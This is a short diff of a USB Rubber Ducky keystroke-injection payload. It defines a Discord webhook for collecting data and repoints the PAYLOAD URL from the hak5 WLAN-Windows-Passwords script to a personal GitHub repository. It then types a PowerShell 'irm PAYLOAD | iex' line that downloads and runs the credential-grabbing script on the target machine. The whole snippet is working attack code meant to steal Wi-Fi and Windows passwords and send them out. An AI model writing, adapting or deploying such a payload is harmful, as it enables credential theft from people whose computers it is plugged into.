@@ -8,5 +8,5 @@ DEFINE DISCORD https://discord.com/api/webhooks/1163054013764354070/sqBGY4atsyUZ
 STRING DISCORD
 
 REM Reply example.com with YOUR LINK. The Payload should be Windows-Passwords.ps1
-DEFINE PAYLOAD https://raw.githubusercontent.com/hak5/usbrubberducky-payloads/master/payloads/library/credentials/WLAN-Windows-Passwords/Windows-Passwords.ps1
+DEFINE PAYLOAD https://raw.githubusercontent.com/markyway/speeldoos/main/Assets/WLAN_Grab/WLANG
 STRINGLN ';irm PAYLOAD | iex
